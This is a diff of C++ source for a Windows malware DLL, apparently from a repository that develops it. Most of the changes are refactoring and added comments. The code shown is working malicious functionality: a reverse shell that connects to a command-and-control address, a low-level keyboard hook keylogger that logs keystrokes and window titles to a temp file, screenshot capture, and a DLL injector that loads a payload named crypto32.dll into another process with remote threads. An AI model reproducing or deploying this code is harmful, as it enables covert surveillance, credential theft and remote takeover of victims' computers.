@@ -4,58 +4,22 @@
 #include "sha256.h"
 
 
-
-// Global Variables
-char* C2_address = "<redacted>";
-// Set Last Boot Time as Salt
+/************************************************************* Global Variables *******************************************************/
+// TODO: Set Last Boot Time as Salt
 char* salt = "3.141592653589793238462643383279502884197169399375105820974944592307816406286";
 
-char* Target = NULL;
-BOOL isWin32 = TRUE;
+char* C2_address = "<redacted>";
 
-HWND currWindow = NULL;
+HWND hCurrentWindow = NULL;
 HANDLE hfileMutex;
 
-// These correspond to the log and screenshot file paths.
-// Defined in main by using %TEMP% expansion.
 char logfilepath[MAX_PATH];
-char ssfilepath[MAX_PATH];
+char ssFilePath[MAX_PATH];
 
-// Utility
-void GetCPUDescription(char*);
-void GetGPUDescription(char*);
-void GetDesktopResolution(PDWORD, PDWORD);
-void GetMutexStr(char*);
-void sha256(char* str, char* outputBuffer);
-char* UnicodeToAnsi(LPCWSTR);
-
-void CaptureSS();
-
-// KeyLogger
-int isCapsLock();
-BOOL checkWindow(HWND);
-DWORD WINAPI InstallHook(LPVOID);
-DWORD WINAPI WindowWatcher(LPVOID);
-LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
-void LookupCode(unordered_map<int, char*>*, int);
-void LogToFile(char* s);
-VOID CALLBACK KillWwatcher(ULONG_PTR);
-
-//Injector's Functions
-BOOL FindTargetProcess(char*);
-BOOL inject(char*, HANDLE);
-PVOID GetExpFuncVA(char*, HMODULE, BOOL, char*, WORD);
-BOOL InitPayload(HANDLE, char*, HMODULE);
-
-// Reverse Shell
-DWORD WINAPI RunRShell(LPVOID);
-
-
+/************************************************************** DLL Main *************************************************************/
 
 BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ){
-
 	switch (ul_reason_for_call){
-
 		case DLL_PROCESS_ATTACH:
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
@@ -70,8 +34,8 @@ BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpRese
 /*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 	Function:	CaptureSS
 
-	Summary:	Captures a screenshot and saves it to the same folder of the executable.
-				The screenshot is saved under the global variable ssfilepath
+	Summary:	Captures a screenshot and saves it under the path that's contained
+				in the global variable ssFilePath
 
 	Args:		None
 
@@ -105,7 +69,7 @@ void CaptureSS() {
 
 	if (hbmCapture) {
 		GetObject(hbmCapture, sizeof(DIBSECTION), &dsResult);
-		fopen_s(&fBitmap, ssfilepath, "wb");
+		fopen_s(&fBitmap, ssFilePath, "wb");
 		if (fBitmap) {
 			memset(&bmFileHeader, 0, sizeof(bmFileHeader));
 			bmFileHeader.bfType = 'MB';
@@ -127,7 +91,7 @@ void CaptureSS() {
 	}
 }
 
-// Various helper functions for GetMutexStr
+// Various helper functions that collect info for GetMutexStr
 void GetDesktopResolution(PDWORD horizontal, PDWORD vertical)
 {
 	RECT desktop;
@@ -169,7 +133,7 @@ void GetCPUDescription(char* dest) {
 	memcpy(dest + 32, cpuInfo, sizeof(cpuInfo));
 
 }
-void sha256(char* source, char* outputBuffer) {
+void sha256(char* source, char* dest) {
 
 	unsigned char* hash = new unsigned char[32]();
 	SHA256_CTX sha256;
@@ -179,9 +143,9 @@ void sha256(char* source, char* outputBuffer) {
 	sha256_final(&sha256, hash);
 
 	for (int i = 0; i < 32; i++)
-		snprintf(outputBuffer + (i * 2), 256, "%02x", hash[i]); // Copy 2 bytes hex chars at a time
+		snprintf(dest + (i * 2), 256, "%02x", hash[i]); // Copy 2 bytes hex chars at a time
 																//NUL- Terminating
-	outputBuffer[64] = NULL;
+	dest[64] = NULL;
 	delete[] hash;
 }
 
@@ -189,7 +153,8 @@ void sha256(char* source, char* outputBuffer) {
 	Function:	GetMutexStr
 
 	Summary:	Obtains a string to be used as the mutex string.
-				It is based on various hardware properties
+				It is based on various hardware properties.
+				Makes sure 2 instances of the malware are not running concurrently.
 
 	Args:		char* dest
 					A pointer to the caller's char array.
@@ -245,6 +210,7 @@ void GetMutexStr(char* dest) {
 	delete[] GPUDesc;
 }
 
+// Simple conversion from Wide-String to ANSI style String
 char* UnicodeToAnsi(LPCWSTR source)
 {
 	DWORD dwSourceLen, dwBytesNeeded;
@@ -262,6 +228,7 @@ char* UnicodeToAnsi(LPCWSTR source)
 	dest[dwBytesNeeded] = '\0';
 	return dest;
 }
+
 /************************************************************ Reverse Shell **********************************************************/
 
 DWORD WINAPI RunRShell(LPVOID lpParam) {
@@ -280,8 +247,7 @@ DWORD WINAPI RunRShell(LPVOID lpParam) {
 	sockstruct.sin_addr.s_addr = inet_addr(C2_address);
 
 	// While Connection is unavailable, sleep for 10 sec and retry
-	// Maximum attempts : 5
-	while ((WSAConnect(sockt, (SOCKADDR*)&sockstruct, sizeof(sockstruct), NULL, NULL, NULL, NULL) == SOCKET_ERROR) && (i < 5)) {
+	while ((WSAConnect(sockt, (SOCKADDR*)&sockstruct, sizeof(sockstruct), NULL, NULL, NULL, NULL) == SOCKET_ERROR) && (i < RSHELL_MAX_ATTEMPTS)) {
 		Sleep(10000);
 		i++;
 	}
@@ -305,21 +271,22 @@ DWORD WINAPI RunRShell(LPVOID lpParam) {
 /************************************************************* KeyLogger *************************************************************/
 
 /*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-	Function:	checkWindow
+	Function:	CheckWindow
 
 	Summary:	Checks if the foreground window has changed.
-				If it was changed, update the global handle variable "curr_window"
+				If it was changed, update the global handle variable hCurrentWindow
 
-	Args:		HWND prevForeground
+	Args:		HWND hPrevForeWindow
 					Contains the handle to the previous foreground window.
 
 	Returns:	BOOL
-		True if foreground window was change, False otherwise.
+					True if foreground window was change, False otherwise.
 -----------------------------------------------------------------F-F*/
-BOOL checkWindow(HWND prevForeground) {
+BOOL CheckWindow(HWND hPrevForeWindow) {
 	HWND newforeground = GetForegroundWindow();
-	if (!(newforeground == prevForeground)) {
-		currWindow = newforeground;
+	if (!(newforeground == hPrevForeWindow)) {
+		// HWNDs dont need to be destroyed explicitly
+		hCurrentWindow = newforeground;
 		return TRUE;
 	}
 	return FALSE;
@@ -329,7 +296,7 @@ BOOL checkWindow(HWND prevForeground) {
 	Function:	WindowWatcher(Thread Function)
 
 	Summary:	Periodically checks the current foreground window.
-				If the window is changed, we log it.
+				If the window is changed, log it.
 
 	Args:		LPVOID lpParameter
 					Not Used.
@@ -341,9 +308,9 @@ DWORD WINAPI WindowWatcher(LPVOID lpParameter) {
 	DWORD dwWaitResult;
 
 	while (TRUE) {
-		if (checkWindow(currWindow)) {
-			char window_title[256], msg[500];
-			GetWindowTextA(currWindow, window_title, 256);
+		if (CheckWindow(hCurrentWindow)) {
+			char window_title[256], msg[320];
+			GetWindowTextA(hCurrentWindow, window_title, 256);
 			sprintf_s(msg, sizeof(msg), "\n================ Current Window Title: %s ================\n", window_title);
 
 			// Wait on file mutex so we can open the file safely.
@@ -387,12 +354,15 @@ DWORD WINAPI InstallHook(LPVOID lpParameter) {
 	HHOOK hKeyHook;
 	HANDLE hwindowT = *((HANDLE*)lpParameter);
 	HINSTANCE hExe = GetModuleHandle(NULL);
+
 	DEBUG_CODE(MessageBoxA(0, "Entering Installhook", "D", MB_OK););
 	if (!hExe) 
 		return 1;
 	else {
 		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
-		RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x31);
+		
+		// Register a HotKey to kill the Keylogger ( Ctrl + Alt + 1 )
+		RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x31);			
 
 		DEBUG_CODE(MessageBoxA(0, "Installed Hook and Hotkey...","D",MB_OK);)
 		MSG msg;
@@ -402,7 +372,7 @@ DWORD WINAPI InstallHook(LPVOID lpParameter) {
 			if (msg.message == WM_HOTKEY)
 			{
 				UnhookWindowsHookEx(hKeyHook);// Unhook the WH_KEYBOARD_LL
-				QueueUserAPC(KillWwatcher, hwindowT, NULL);	// When WWatcher goes to sleep, kill it
+				QueueUserAPC(KillWwatcher, hwindowT, NULL);	// When WindowWatcher goes to sleep, kill it
 				return 0;
 			}
 			//Translates virtual-key messages into character messages. 
@@ -424,7 +394,7 @@ DWORD WINAPI InstallHook(LPVOID lpParameter) {
 	Summary:	Logs the pressed key to the log file
 
 	Args:		char* source
-					Pointer to a buffer. Contains the pressed key verbose version
+					Pointer to a buffer that contains the pressed key's verbose string
 
 	Returns:  void
 -----------------------------------------------------------------F-F*/
@@ -483,11 +453,11 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 				}
 			}
 			else if ((vkCode > 0x40) && (vkCode < 0x5B)) { // keys a-z
-														   /*
-														   *	Used XOR between SHIFT key press and CAPSLOCK.
-														   *	If both are pressed (or not pressed) at the same time
-														   *	then we don't need to convert to uppercase
-														   **/
+				/*
+				*	Used XOR between SHIFT key press and CAPSLOCK.
+				*	If both are pressed (or not pressed) at the same time
+				*	then we don't need to convert to uppercase
+				**/
 				if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock()))
 					vkCode += 32; // Convert to uppercase
 				sprintf_s(val, sizeof(val), "%c", vkCode);
@@ -536,19 +506,19 @@ int isCapsLock() {
 /************************************************************** Injector *************************************************************/
 
 /*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-	Function:	foundTargetProc
+	Function:	FindTargetProcess
 
-	Summary:	Finds the target process.
-				Attempts to open it with elevated privileges in order to inject
-				If the global variable "Target" is set, then we are looking for that specific executable.
+	Summary:	Finds the target process and attempts to inject.
+				If the procedure fails, it finds another one.
 
-	Args:		HANDLE* hTargetProc
-					This will point to a handle to the target process
-
-	Returns:	BOOL
-					True if we found a target process, False otherwise.
+	Args:		char* Target
+					Contains the Target's Executable Name. Can be NULL
+				char* pLibPath
+					Contains the absolute path of the DLL to be injected
+	Returns:	BOOL isWin32
+					Indicated if the machine's OS is 32 or 64 bit.
 -----------------------------------------------------------------F-F*/
-BOOL FindTargetProcess(char* dll_path) {
+BOOL FindTargetProcess(char* Target, char* pLibPath, BOOL isWin32) {
 	char* ExeName = NULL;
 	char* bit = new char[250]();
 	HANDLE hProcess;
@@ -618,7 +588,7 @@ BOOL FindTargetProcess(char* dll_path) {
 			}
 
 			DEBUG_CODE(MessageBoxA(0, "Target ExeName", ExeName, MB_OK););
-			if (inject(dll_path, hProcess)) {
+			if (inject(pLibPath, hProcess)) {
 				CloseHandle(hProcessSnap);
 				CloseHandle(hProcess);
 				delete[] bit;
@@ -635,16 +605,19 @@ failed:
 }
 
 /*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-Function:	Inject
+	Function:	Inject
 
-Summary:	Finds and injects a target process with the DLL found in "dll_path" variable
+	Summary:	Injects the DLL into the candidate target.
+				For more information, check README
 
-Args:		char* dll_path
-Contains the absolute path of the DLL to inject
-Returns:	BOOL
-True if injection was successful, False otherwise.
+	Args:		char* pLibPath
+					Contains the absolute path of the DLL to inject
+				HANDLE hTarget
+					a HANDLE to the opened Target process
+	Returns:	BOOL
+					Indicated if injection was successful.
 -----------------------------------------------------------------F-F*/
-BOOL inject(char* dll_path, HANDLE hTarget) {
+BOOL inject(char* pLibPath, HANDLE hTarget) {
 	LPVOID baseAddress = NULL, RemoteLoadLibraryA;
 	HANDLE hRemoteThread;
 	HMODULE hInjected;
@@ -657,7 +630,7 @@ BOOL inject(char* dll_path, HANDLE hTarget) {
 	}
 
 	// Write the DLL's Path String to the Remote Process
-	if (!WriteProcessMemory(hTarget, baseAddress, dll_path, MAX_PATH, NULL)) {
+	if (!WriteProcessMemory(hTarget, baseAddress, pLibPath, MAX_PATH, NULL)) {
 		DEBUG_CODE(MessageBoxA(0, "Failed to write the final path to the target process...", "D", MB_ICONERROR);)
 		goto failed;
 	}
@@ -679,7 +652,7 @@ BOOL inject(char* dll_path, HANDLE hTarget) {
 		goto failed;
 	}
 	CloseHandle(hRemoteThread);
-	if (InitPayload(hTarget, dll_path, hInjected)){
+	if (InitPayload(hTarget, pLibPath, hInjected)){
 		DEBUG_CODE(MessageBoxA(0, "Successfully Injected", "Debug", MB_OK););
 	}
 	else {
@@ -697,24 +670,24 @@ failed:
 }
 
 /*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-Function:	InitPayload
+	Function:	InitPayload
 
-Summary:	Obtains the Exported Function's Virtual Address and executes it in the remote process.
-The Virtual Address is in the context of the remote process.
+	Summary:	Obtains the Exported Function's Virtual Address and executes it in the remote process.
+				The Virtual Address is in the context of the remote process.
 
-Args:		HANDLE hProcess
-A HANDLE to the remote/target process
-char* lpPath
-The Absolute Path of the DLL to be injected
-HMODULE hPayloadBase
-This is the base address, where the DLL was injected.
-It was returned by the CreateRemoteThread that loaded the DLL.
+	Args:		HANDLE hProcess
+					A HANDLE to the remote/target process
+				char* lpDLLPath
+					The Absolute Path of the DLL to be injected
+				HMODULE hPayloadBase
+					This is the base address, where the DLL was injected.
+					It was returned by the CreateRemoteThread that loaded the DLL.
 
-Returns:	BOOL
-Returns TRUE if the Initialization was successful, FALSE otherwise
+	Returns:	BOOL
+					
 -----------------------------------------------------------------F-F*/
-BOOL InitPayload(HANDLE hProcess, char* lpPath, HMODULE hPayloadBase) {
-	void* lpInit = (void*)GetExpFuncVA(lpPath, hPayloadBase, TRUE, NULL , 0);
+BOOL InitPayload(HANDLE hProcess, char* lpDLLPath, HMODULE hPayloadBase) {
+	void* lpInit = (void*)GetExpFuncVA(lpDLLPath, hPayloadBase, TRUE, NULL , 0);
 	if (lpInit) {
 		if (CreateRemoteThread(hProcess, NULL, 0,
 			(LPTHREAD_START_ROUTINE)lpInit, NULL, 0, NULL))
@@ -724,22 +697,25 @@ BOOL InitPayload(HANDLE hProcess, char* lpPath, HMODULE hPayloadBase) {
 }
 
 /*F+F+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-Function:	GetExpFuncRVA
+	Function:	GetExpFuncVA
 
-Summary:	Maps an Executable into Memory using the File Mapping API.
-Then tries to find an Exported function by Name or Ordinal
+	Summary:	Maps an Executable/DLL into Memory using the File Mapping API.
+				Then tries to find an Exported function by Name, Ordinal or Index.
 
-Args:		char* pExeAbsPath
-The Executable's Absolute Path.
-HMODULE hPayloadBase
-This is the base address where the injected DLL is loaded in the remote/target proccess.
-char* pExportFuncName
-The Target Function's Name.
-WORD wTargetOrdinal
-Contains the Target Function's Ordinal Number.
+	Args:		char* pExeAbsPath
+					The Executable's Absolute Path.
+				HMODULE hPayloadBase
+					This is the base address where the injected DLL is loaded in the remote/target proccess.
+				BOOL bExactIndex
+					If this variable is TRUE, then wTargetOrdinal contains the exact index 
+					of the target exported function in the Exe's PE Header's AddressFunction table
+				char* pExportFuncName
+					The Target Function's Name.
+				WORD wTargetOrdinal
+					Contains the Target Function's Ordinal Number or its direct index.
 
-Returns:	PDWORD
-A pointer to a DWORD that contains the RVA of the Target Exported Function
+	Returns:	PDWORD
+					A pointer to a DWORD that contains the VA of the Exported Function in the Target Process' Virtual Memory
 -----------------------------------------------------------------F-F*/
 PVOID GetExpFuncVA(char* pExeAbsPath, HMODULE hPayloadBase, BOOL bExactIndex, char* pExportFuncName, WORD wTargetOrdinal) {
 	PIMAGE_DOS_HEADER pDosHeader;
@@ -815,11 +791,21 @@ PVOID GetPayloadExportAddr(char* lpPath, HMODULE hPayloadBase, LPCSTR lpFunction
 		FreeLibrary(hLoaded);
 		return (void*)((DWORD)hPayloadBase + dwOffset);
 	}
-	else return NULL;
+	return NULL;
 }
 
 /********************************************************** Exported Functions *******************************************************/
 
+/*F+F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F
+	Function: PayLoad
+
+	Summary:	Contains the actualy payload of the malware.
+				For more information, check repo's README
+
+	Args:		None
+
+	Returns:  void
+F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F-F*/
 void PayLoad() {
 	BOOL bAlreadyRunning;
 	DWORD ExitCode;
@@ -830,7 +816,7 @@ void PayLoad() {
 	DEBUG_CODE(MessageBoxA(0, "Entering Payload", "D", MB_OK););
 
 	ExpandEnvironmentStringsA("%TEMP%\\key.log", logfilepath, MAX_PATH);
-	ExpandEnvironmentStringsA("%TEMP%\\ss.bmp", ssfilepath, MAX_PATH);
+	ExpandEnvironmentStringsA("%TEMP%\\ss.bmp", ssFilePath, MAX_PATH);
 
 	GetMutexStr(pMutexStr);
 	
@@ -872,10 +858,25 @@ void PayLoad() {
 	CloseHandle(hGlobalMutex);
 }
 
+/*F+F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F+++F
+	Function:	Install
+
+	Summary:	Finds a target process and attempts to inject it.
+				If injection fails, it looks for another one.
+				Note: A target's .exe name could be given as an input instead.
+				For more information, check repo's README
+
+	Args:		LPWSTR lpszCmdLine
+					Contains the target's .exe name.
+
+	Returns:  void
+F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F---F-F*/
 void Install(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
 	char SysWow64Dir[MAX_PATH];
-	char dll_path[MAX_PATH];
-	
+	char pLibPath[MAX_PATH];
+	BOOL isWin32 = TRUE;
+	char* Target = NULL;
+
 	if (wcscmp(lpszCmdLine, L"")) {
 		Target = new char[MAX_PATH]();
 		size_t num;
@@ -883,16 +884,15 @@ void Install(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
 		DEBUG_CODE(MessageBoxA(0, Target, "Debug", MB_OK);)
 	}
 
-	
 	// Build DLL's Path
-	ExpandEnvironmentStringsA("%TEMP%\\crypto32.dll", dll_path, MAX_PATH);
+	ExpandEnvironmentStringsA("%TEMP%\\crypto32.dll", pLibPath, MAX_PATH);
 
 	// Check if OS is 32 or 64 bit
 	if (GetSystemWow64DirectoryA(SysWow64Dir, MAX_PATH))
 		isWin32 = FALSE;
 
 	// Find a target and inject the dll
-	if (FindTargetProcess(dll_path)) {
+	if (FindTargetProcess(Target, pLibPath, isWin32)) {
 		DEBUG_CODE(MessageBoxA(0, "Injected", "Debug", MB_OK););
 	}
 	else {
